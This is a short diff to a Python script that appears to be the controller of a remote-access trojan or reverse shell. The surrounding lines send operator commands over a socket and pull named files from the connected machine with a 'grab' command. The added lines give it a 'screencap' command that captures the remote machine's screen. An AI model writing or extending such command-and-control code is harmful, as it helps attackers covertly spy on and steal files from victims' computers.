@@ -37,6 +37,12 @@ def connect():
             grab, filename = command.split("*")
             transfer(conn, command, filename)
 
+        elif 'screencap' in command:
+            conn.send(command)
+            data = conn.recv(1024)
+            while 'DONE' not in data:
+                data = conn.recv(1024)
+
         else:
             conn.send(command)  # send Command
             data = conn.recv(1024)
